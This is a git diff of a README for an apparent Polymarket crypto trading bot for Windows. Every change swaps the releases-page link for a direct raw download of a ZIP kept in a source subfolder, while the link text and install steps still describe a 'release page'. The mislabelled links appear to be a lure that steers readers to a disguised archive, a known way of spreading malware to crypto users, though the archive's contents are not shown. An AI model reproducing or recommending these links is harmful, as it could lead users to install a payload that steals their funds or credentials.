@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Crypto-Market-Bot - Trade Crypto Markets With Precision
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Polymarket-Crypto-Market-Bot is a Windows app for crypto market trading on Polym
 
 Use the release page to get the latest version:
 
-[Visit the release page to download](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+[Visit the release page to download](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip)
 
 ## 🖥️ What You Need
 
@@ -26,7 +26,7 @@ The app is built for regular desktop use. You do not need programming skills to 
 
 Follow these steps on Windows:
 
-1. Open the release page: [https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+1. Open the release page: [https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip)
 2. Find the latest release near the top of the page
 3. Under **Assets**, download the Windows file for the app
 4. If the file comes as a ZIP folder, right-click it and choose **Extract All**
@@ -158,7 +158,7 @@ Keep all files in the same folder. Do not move only part of the app.
 
 To update, use the release page again:
 
-1. Open [https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+1. Open [https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip)
 2. Download the newest Windows release
 3. Replace the old app files with the new ones if needed
 4. Open the app and load your settings again
@@ -187,7 +187,7 @@ Small setup checks can save time during fast market moves
 
 If you need the installer or app file again, use the release page here:
 
-[https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+[https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/raw/refs/heads/main/src/analysis/Market_Bot_Crypto_Polymarket_v3.3.zip)
 
 ## 🗂️ Repository Topics
 
